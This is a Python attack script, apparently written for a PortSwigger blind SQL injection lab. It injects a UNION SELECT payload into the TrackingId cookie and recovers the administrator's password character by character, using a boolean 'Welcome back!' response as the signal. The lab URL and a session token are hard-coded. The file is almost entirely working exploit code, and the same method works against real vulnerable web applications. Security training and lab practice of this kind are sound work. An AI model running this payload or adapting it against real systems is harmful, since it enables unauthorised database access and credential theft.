import requests
import re

"""
    This was written to take advantage of a vulnerable cookie in a Portswigger blind SQL injection lab.
    The cookie value, when queried against the DB, allows a UNION query to be appended to it.
    The UNION query returns true when a submitted character matches the character at the 
    stated position in the administrator's password.
    
    This script takes a string of all possible password characters, and compares them one at a time
    to the first character in the administrator's password. Following a match, records the character 
    in a new pasword string, and starts the comparison over again on the second character in the 
    administrator's password, etc.
"""

#String containing all possible characters in the password:
chars = 'abcdefghijklmnopqrtstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

#Target url and session cookie:
url = "https://ac391fd51eccc7a880808bc400f90059.web-security-academy.net/product?productId=9"
jar = requests.cookies.RequestsCookieJar()
jar.set('session', 'rLSvqeGJpNbkiO2ZYGFKozs3dIWGkv1d', domain='web-security-academy.net')

# Choosing a while loop because control is needed over the chars index.
# The chars index needs to start over after every match.
# Labs indicated it should be an 8 char pass:
i = 0
passindex = 1
passwd = ""
while (i < len(chars)):
    
    # Set the malicious cookie w SQLi payload prior to sending.
    vuln_cookie = "uOIasdfQgi' UNION SELECT 'a' FROM USERS WHERE username = 'administrator' AND SUBSTRING(password, {}, 1) = '{}' --"
    jar.set(
        'TrackingId', 
        vuln_cookie.format(str(passindex), str(chars[i])), 
        domain='web-security-academy.net'
    )

    r = requests.get(url, cookies=jar)
    #DEBUG print(jar.items())
    
    # If response contains "Welcome back!", then the submitted character matches 
    # for the stated position in the password.
    match = re.search("Welcome back!", r.text)
    if (match): 
        print("Password character: {}".format(chars[i]))
        passwd += chars[i] 
        i = -1
        passindex += 1
    
    i += 1

# When all printable characters have been exhausted, then the password must be complete.
print(passwd)
